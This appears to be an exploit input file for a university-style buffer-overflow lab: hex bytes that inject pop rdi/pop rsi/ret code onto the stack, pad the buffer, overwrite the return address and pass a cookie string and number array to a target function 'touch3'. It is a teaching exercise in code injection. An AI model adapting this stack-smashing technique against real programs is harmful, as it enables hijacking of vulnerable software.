/* Injected Code */
5f	/* pop rdi */
5e	/* pop rsi */
c3	/* return */

/* Padding */
00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00

/* Retrun address: Injected Code */
68 8e 65 55 00 00 00 00

/* Arguments as pointer1 and pointer2 */
30 8f 65 55 00 00 00 00 /* Cookie string for rsi */
39 8f 65 55 00 00 00 00 /* nums Array */

/* Return address touch3 */
b7 18 40 00 00 00 00 00 

/* Actual Contents */
31 36 65 32 31 33 31 34 00 				/* cookie string */
c9 00 f8 00 c5 00 c4 00 c6 00 c4 00 c7 00 c4 00 	/* nums array */







